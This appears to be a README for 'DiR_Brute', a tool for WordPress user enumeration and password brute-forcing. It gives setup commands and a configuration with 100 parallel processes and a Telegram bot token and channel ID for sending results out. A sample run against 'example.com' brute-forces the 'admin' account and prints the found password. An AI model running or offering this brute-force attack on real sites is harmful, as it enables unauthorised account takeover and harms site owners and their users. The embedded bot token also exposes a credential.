DiR_Brute
=======

Wordpress user enumeration and password bruteforce.

  ####User Setup:
<code>$ ./Setup.sh</code>

  ####Configure file set :
<code>$ vi configure.conf</code>
<pre>
###############################################################
 
                  DIR BRUTE FORCE CONFIGURE
 
###############################################################
 
#Default Configure options
#-Use multiprocess ?
_Multiproccessing=ON
#-How Many Running Processes ? (Default 50)
_Processes=100
 
#Listing options
#-Extensions ex) php,html,txt
_Extension=php,txt
#-Logging only have size files
_Logging_1=OFF

#APIs
#-TelegramAPI Activation
_API_Enable=ON
#-Bot token ex) bot382743792:AAH3yf7N-h8WWD-xYD96m0V-PIozhcp86BE
_Bot_Token=bot381753792:AAH3yf7N-h9WWD-xYD96m0V-PIozhcp86BE
#-Channel ID ex) 1001393182576
_Channel_ID=1001393565576
</pre>
  ####Script use:
<code>$ ./dirbrute 'example.com' 'listfile name'</code>
<pre>
[+] Bruteforcing user [admin]
123456
test123
123test123
The password is: 123test123
</pre>
